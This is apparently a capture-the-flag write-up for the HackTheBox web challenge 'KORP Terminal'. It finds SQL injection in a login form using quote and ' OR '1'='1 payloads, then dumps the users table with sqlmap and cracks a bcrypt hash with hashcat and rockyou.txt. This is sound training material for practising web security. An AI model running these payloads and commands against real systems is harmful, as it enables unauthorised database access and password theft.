# :game_die: HTB Challenge Write-Up: KORP Terminal

---

# HTB Challenge Write-Up: KORP Terminal

## Information Gathering

KORP Terminal features a login form that resembles a DOS text-based GUI. Since the challenge didn’t provide any source code for review, we’ll try to gather as much information as possible about the application.

Wappalyzer and Nmap scans didn’t reveal anything useful, but examining the response headers shows that the server is running *Werkzeug 3.0.1* on *Python 3.12.2*.

Our information is still insufficient, so we have two approaches to consider: finding Werkzeug 3.0.1 vulnerabilities or testing for injection vulnerabilities, given the presence of a login form.

## Vulnerability Assessment

The first thing I do when encountering a login form is test for *SQL Injection*. I’m using Burp Suite’s built-in browser to capture HTTP requests, which we can later resend with different payloads. Let’s start by using a single quote for both the username and password.

```
username=%27&password=%27
```

Noticed the `%27`? That’s the URL-encoded value for a single quote. That aside, the response to this payload revealed that the application is vulnerable to SQL injection.

```
{"error":{"message":["1064","1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''''' at line 1","42000"],"type":"ProgrammingError"}}
```

Now, let’s see if we can log in using the infamous `' OR '1'='1` payload.

```
username=%27+OR+%271%27%3D%271&password=%27+OR+%271%27%3D%271
```

That didn’t work, which suggests that the application first uses the username to query the database and compares the fetched password hash with the inputted password. Something like this:

```
sql = "SELECT password FROM users WHERE username='" + username + "'"
cursor.execute(sql)
row = cursor.fetchone()

if row:
# Compare the password hash with the inputted password
```

Now that we know the application is vulnerable to SQL Injection, which fields are injectable, and even the database used *(MariaDB)*, let’s use SQLmap to see what data we can extract.

## Exploitation

Since we have the login request in our Burp Suite HTTP history, let’s copy it and save it to a text file. We’ll be using it as input for SQLmap. Here’s an example:

```
POST / HTTP/1.1
Host: 94.237.50.242:59899
Content-Length: 35
Cache-Control: max-age=0
Accept-Language: en-US
Upgrade-Insecure-Requests: 1
Origin: http://94.237.50.242:59899
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.127 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://94.237.50.242:59899/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

username=username&password=password
```

Next, we’ll use the following command, which essentially means applying *MySQL* SQLi payloads to the username field in the HTTP request from `request.txt`:

```
sqlmap -r request.txt -p username --dbms=mysql --ignore-code 401 --batch
```

SQLmap identified injection techniques it can use to exploit the database. But wait! Why MySQL? Because MariaDB functioned as a “drop-in replacement” for MySQL. The two had many similarities.

## Get Pat Bautista’s stories in your inbox

Join Medium for free to get updates from this writer.

Remember me for faster sign in

Let’s now enumerate its tables so we can target interesting ones.

```
sqlmap -r request.txt -p username --dbms=mysql --ignore-code 401 --batch --tables
```

The `users` table looks interesting. Let’s “dump” its contents.

```
sqlmap -r /tmp/request.txt -p username --dbms=mysql --ignore-code 401 --batch -T users --dump
```

It looks like the application is using a *Bcrypt* hash, but to be sure, let’s confirm it using Hashcat.

```
hashcat --identify '<hash>'
```

I knew it! It was Bcrypt. Now, let’s crack the password with Hashcat using `rockyou.txt` for the wordlist. We’ll save the password hash to a text file named `password.txt` and then use the following commands:

```
hashcat -m 3200 password.txt ~/Tools/rockyou.txt
```

Finally, we can log in using the username we extracted with SQLmap and the password we cracked with Hashcat.

That was a lot of steps!

## References

---
